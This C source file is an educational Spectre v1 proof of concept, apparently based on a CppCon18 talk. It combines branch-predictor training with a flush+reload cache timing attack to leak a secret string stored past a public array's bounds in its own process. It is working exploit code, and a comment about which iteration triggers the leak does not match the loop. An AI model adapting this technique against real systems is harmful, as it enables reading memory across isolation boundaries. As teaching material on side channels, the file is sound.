/* spectrev1.c
 *
 * Code inspired by CppCon18 talk on spectre from Chandler Carruth
*/

#include <x86intrin.h>
#include <stdio.h>

// our public array
const char public[] = "Hello world!";
// our secret array (we assume it lies in the memory behind the public string but there is some padding!)
const char secret[] = "This is my secret!";
// just the sizes of our arrays
const int public_size = sizeof(public)/sizeof(char);
const int secret_size = sizeof(secret)/sizeof(char);

// read a memory location
void force_read(volatile __m128 *p) {
  // the volatile keyword prevents compiler/CPU optimizing the read away
  __m128 dummy = *p;
}

// high precision CPU timestamp
long read_timer()
{
  unsigned int dummy;
  return __rdtscp(&dummy);
}

// perform cache attack against data[idx] with idx >= data_size
char leak_byte(const char* data, int data_size, int idx)
{
  // define array used to measure access times to cache lines
  // we use some larger stride larger than a cache line (64 bytes)
#define stride 512
  static __m128 timing_array[256*stride];
  // set the timing_array to some value so everything is well-defined
  // (and the physical memory is allocated, like needed for NUMA placement?)
  for(int i = 0; i < 256*stride; i++)
    timing_array[i] = _mm_setzero_ps();

  // array for measured latencies
  long latencies[256];
  for(int i = 0; i < 256; i++)
    latencies[i] = 0;

  int* data_size_in_memory = malloc(sizeof(int));
  *data_size_in_memory = data_size;

  for(int run = 0; run < 50; run++)
  {
    // get some safe index we are allowed to access
    int safe_idx = run % data_size;

    // flush all of timing array
    // (-> removes timing array from cache!)
    for(int i = 0; i < 256; i++)
      _mm_clflush(&timing_array[i * stride]);

    // perform reads that are data-dependent on the secret
    // as a program being attacked might
    for(int i = 0; i < 50; i++)
    {
      // ensure the bounds-check value is not in cache
      _mm_clflush(data_size_in_memory);

      // We train the CPU to predict that we usually provide a safe index
      // but we are interested in the last iteration (i=49) where we use the leak index.
      // This will have a cache effect even when the condition is false!
      int cur_idx = (i+1) % 10 != 0 ? safe_idx : idx;
      if( cur_idx < *data_size_in_memory )
        force_read(&timing_array[data[cur_idx] * stride]);
    }

    // now measure read latencies to see if we can detect what data[idx] was
    for(int i = 0; i < 256; i++)
    {
      __m128 *timing_entry = &timing_array[i * stride];
      long start = read_timer();
      force_read(timing_entry);
      latencies[i] += read_timer() - start;
    }
  }

  free(data_size_in_memory);

  // return the entry with the smallest measured latency
  int best_val = 0;
  for(int i = 0; i < 256; i++)
  {
    if( latencies[i] < latencies[best_val] )
      best_val = i;
  }
  return (char) best_val;
}


int main()
{
  // just leak bytes behind the public string
  for(int i = public_size; i < public_size+secret_size+4; i++)
  {
    char c = leak_byte(public, public_size, i);
    printf("got: %c\n", c);
  }
  return 0;
}

